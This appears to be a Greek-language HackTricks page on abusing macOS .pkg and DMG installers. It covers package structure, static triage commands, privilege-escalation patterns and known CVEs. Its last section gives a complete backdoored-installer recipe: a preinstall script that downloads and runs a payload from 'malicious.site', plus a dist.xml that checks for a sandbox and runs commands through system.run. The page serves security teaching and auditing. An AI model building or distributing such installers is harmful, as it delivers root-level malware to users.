# Abuse των macOS Installers

{{#include ../../../banners/hacktricks-training.md}}

## Βασικές πληροφορίες Pkg

Ένα **πακέτο εγκατάστασης** macOS (γνωστό επίσης ως αρχείο `.pkg`) είναι μια μορφή αρχείου που χρησιμοποιείται από το macOS για τη **διανομή software**. Αυτά τα αρχεία μοιάζουν με ένα **κουτί που περιέχει όλα όσα χρειάζεται ένα τμήμα software** για να εγκατασταθεί και να εκτελεστεί σωστά.

Το ίδιο το αρχείο πακέτου είναι ένα archive που περιέχει μια **ιεραρχία αρχείων και directories που θα εγκατασταθούν στον υπολογιστή-στόχο**. Μπορεί επίσης να περιλαμβάνει **scripts** για την εκτέλεση ενεργειών πριν και μετά την εγκατάσταση, όπως η ρύθμιση αρχείων configuration ή ο καθαρισμός παλαιών εκδόσεων του software.

### Ιεραρχία

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Customizations (τίτλος, κείμενο υποδοχής…) και έλεγχοι scripts/εγκατάστασης
- **PackageInfo (xml)**: Πληροφορίες, απαιτήσεις εγκατάστασης, τοποθεσία εγκατάστασης, paths προς scripts για εκτέλεση
- **Bill of materials (bom)**: Λίστα αρχείων προς εγκατάσταση, ενημέρωση ή αφαίρεση, μαζί με τα file permissions
- **Payload (CPIO archive gzip compressed)**: Αρχεία προς εγκατάσταση στο `install-location` από το PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Pre και post install scripts και επιπλέον resources που εξάγονται σε προσωρινό directory για εκτέλεση.

### Αποσυμπίεση
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Για να οπτικοποιήσετε τα περιεχόμενα του installer χωρίς να το αποσυμπιέσετε χειροκίνητα, μπορείτε επίσης να χρησιμοποιήσετε το δωρεάν εργαλείο [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Συντομεύσεις για static triage

Αν ο στόχος είναι η ανάλυση, προσπαθήστε να **αποφύγετε αρχικά το άνοιγμα του package με το `Installer.app`**. Ορισμένα packages μπορούν να εκτελέσουν κώδικα μόλις τα ανοίξει το Installer (για παράδειγμα μέσω του `system.run()` ή installer plug-ins), επομένως η offline εξαγωγή είναι συνήθως το ασφαλέστερο σημείο εκκίνησης.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## Βασικές πληροφορίες για τα DMG

Τα αρχεία DMG, ή Apple Disk Images, είναι μια μορφή αρχείου που χρησιμοποιείται από το macOS της Apple για disk images. Ένα αρχείο DMG είναι ουσιαστικά ένα **disk image με δυνατότητα προσάρτησης** (περιέχει το δικό του filesystem), το οποίο περιέχει raw block data, συνήθως συμπιεσμένα και μερικές φορές κρυπτογραφημένα. Όταν ανοίγετε ένα αρχείο DMG, το macOS το **προσαρτά σαν να ήταν φυσικός δίσκος**, επιτρέποντάς σας να αποκτήσετε πρόσβαση στα περιεχόμενά του.

> [!CAUTION]
> Σημειώστε ότι οι installers **`.dmg`** υποστηρίζουν **τόσες πολλές μορφές**, ώστε στο παρελθόν ορισμένοι από αυτούς που περιείχαν vulnerabilities να έχουν γίνει abuse για την επίτευξη **kernel code execution**.

### Ιεραρχία

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Η ιεραρχία ενός αρχείου DMG μπορεί να διαφέρει ανάλογα με το περιεχόμενο. Ωστόσο, για application DMGs, συνήθως ακολουθεί την εξής δομή:

- Top Level: Αυτό είναι το root του disk image. Συχνά περιέχει την εφαρμογή και πιθανώς ένα link προς τον φάκελο Applications.
- Application (.app): Αυτή είναι η πραγματική εφαρμογή. Στο macOS, μια εφαρμογή είναι συνήθως ένα package που περιέχει πολλά μεμονωμένα αρχεία και φακέλους τα οποία αποτελούν την εφαρμογή.
- Applications Link: Αυτό είναι ένα shortcut προς τον φάκελο Applications στο macOS. Σκοπός του είναι να διευκολύνει την εγκατάσταση της εφαρμογής. Μπορείτε να σύρετε το αρχείο .app σε αυτό το shortcut για να εγκαταστήσετε την εφαρμογή.

## Privesc μέσω pkg abuse

### Εκτέλεση από public directories

Εάν ένα pre ή post installation script εκτελείται, για παράδειγμα, από το **`/var/tmp/Installerutil`**, και ένας attacker μπορεί να ελέγξει αυτό το script, μπορεί να κάνει escalate privileges κάθε φορά που αυτό εκτελείται. Ένα άλλο παρόμοιο παράδειγμα:<sup>[[1]](#references)[[3]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Αυτή είναι μια [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) την οποία καλούν αρκετοί installers και updaters για να **εκτελέσουν κάτι ως root**. Αυτή η function δέχεται ως παράμετρο το **path** του **file** προς **εκτέλεση**· ωστόσο, εάν ένας attacker μπορούσε να **τροποποιήσει** αυτό το file, θα μπορούσε να κάνει **abuse** στην εκτέλεσή του με root για να **κάνει escalate privileges**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Για περισσότερες πληροφορίες, δείτε αυτή την ομιλία: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Κατάχρηση environment και shebang

Τα σύγχρονα bugs του PackageKit έδειξαν ότι τα installer scripts συχνά εκτελούνται ως **trusted root code**, ενώ παράλληλα διατηρούν κοντά τους attacker-controlled context. Κατά τον έλεγχο vendor packages, δώστε ιδιαίτερη προσοχή στα εξής:

- Shell interpreters όπως `#!/bin/zsh` / `#!/bin/bash`
- Κλήσεις όπως `sudo -u $USER`, `launchctl asuser` ή οποιαδήποτε λογική που εμπιστεύεται τα `$USER`, `$HOME`, `PATH`, `TMPDIR` ή relative paths
- Non-shell interpreters που ενδέχεται να φορτώνουν user-controlled init files ή libraries
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Για το bug του root-environment του PackageKit το 2024 (`~/.zshenv` / `~/.bash*` inheritance κατά την εγκατάσταση που ξεκινά από τον χρήστη), ελέγξτε [τη generic σελίδα macOS privesc](../macos-privilege-escalation.md). Αν το package είναι **Apple-signed**, το ίδιο script bug μπορεί να γίνει **SIP/TCC-relevant**, επειδή το `system_installd` μπορεί να φέρει το `com.apple.rootless.install.heritable`. Δείτε [τη σελίδα SIP](../macos-security-protections/macos-sip.md).<sup>[[5]](#references)[[6]](#references)</sup>

### Εκτέλεση μέσω mounting

Αν ένας installer γράφει στο `/tmp/fixedname/bla/bla`, είναι δυνατό να **δημιουργήσετε ένα mount** πάνω από το `/tmp/fixedname` με noowners, ώστε να μπορείτε να **τροποποιήσετε οποιοδήποτε αρχείο κατά την εγκατάσταση** για να κάνετε abuse της διαδικασίας εγκατάστασης.

Παράδειγμα αποτελεί το **CVE-2021-26089**, το οποίο κατάφερε να **overwrite ένα periodic script** και να αποκτήσει execution ως root. Για περισσότερες πληροφορίες, δείτε την ομιλία: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## pkg ως malware

### Άδειο Payload

Είναι δυνατό να δημιουργηθεί απλώς ένα **`.pkg`** file με **pre και post-install scripts**, χωρίς πραγματικό payload, εκτός από το malware που περιέχεται στα scripts.<sup>[[2]](#references)</sup>

### JS στο Distribution xml

Είναι δυνατό να προστεθούν tags **`<script>`** στο **distribution xml** file του package, και αυτός ο κώδικας θα εκτελεστεί και μπορεί να **εκτελέσει commands** χρησιμοποιώντας το **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Στα distribution packages αυτό συνήθως εξαρτάται από το top-level `Distribution` file που ενεργοποιεί external scripts, για παράδειγμα με `allow-external-scripts="true"`. Επομένως, η εξέταση μόνο των `preinstall` / `postinstall` δεν αρκεί: το **Distribution XML από μόνο του** μπορεί να περιέχει hooks `installation-check` / `volume-check` και direct execution paths μέσω `system.run()` / `system.runOnce()`.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Backdoored Installer

Κακόβουλο installer που χρησιμοποιεί ένα script και κώδικα JS μέσα στο dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## Αναφορές

- [1] [DEF CON 27 - Unpacking Pkgs: Μια ματιά στο εσωτερικό των Macos Installer Packages και στα συνήθη Security Flaws](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Unpacking Pkgs: Μια ματιά στο εσωτερικό των MacOS Installer Packages](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – macOS Red Teaming: Exploiting Installer Packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Breaking SIP with Apple-signed Packages](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - Death By 1000 Installers on macOS and it's all broken!](https://www.youtube.com/watch?v=lTOItyjTTkw)

{{#include ../../../banners/hacktricks-training.md}}
